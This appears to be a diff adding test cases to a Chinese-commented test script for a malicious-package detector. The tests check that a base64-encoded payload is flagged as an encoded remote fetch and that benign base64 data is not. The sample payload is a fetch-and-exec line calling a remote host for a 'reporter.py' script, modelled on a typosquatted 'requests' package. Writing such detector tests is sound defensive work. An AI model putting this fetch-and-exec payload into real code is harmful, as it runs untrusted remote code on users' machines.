@@ -254,5 +254,24 @@ check("敌意载荷→任意 sink 定罪（单节点证据例外）",
 check("规则 2 不受影响：任意源→外传 定罪",
       escalation_gate([chain('file_read', 'data_exfiltration')]) != '')
 
+print("=== 11. 编码载荷（requsets 族，2026-11）===")
+import base64 as _b64
+_real = _b64.b64encode(
+    b'exec(__import__("importlib").import_module("urllib.request")'
+    b'.urlopen("https://cyberresearch.pythonanywhere.com/reporter.py")'
+    b'.read().decode())').decode()
+c_enc = taint("exec(base64.b64decode(b'" + _real + "'))")
+hw_enc = [x for x in c_enc if x['source_category'] == 'hardcoded_payload']
+check("base64 编码的远程加载载荷 → hardcoded_payload", len(hw_enc) == 1,
+      detail=str([c['source_category'] for c in c_enc]))
+check("payload_kind 标为 encoded_remote_fetch",
+      bool(hw_enc) and hw_enc[0].get('payload_kind') == 'encoded_remote_fetch',
+      detail=str(hw_enc[0].get('payload_kind') if hw_enc else None))
+check("编码载荷通过升级门", bool(escalation_gate(hw_enc)))
+_benign = _b64.b64encode(b'{"name": "requests", "version": "2.31.0", "author": "Kenneth"}').decode()
+c_ok = [x for x in taint("data = base64.b64decode(b'" + _benign + "')")
+        if x['source_category'] == 'hardcoded_payload']
+check("良性 base64 数据不触发", len(c_ok) == 0, detail=str(len(c_ok)))
+
 print(f"\n结果: {PASS} 通过, {FAIL} 失败")
 sys.exit(1 if FAIL else 0)
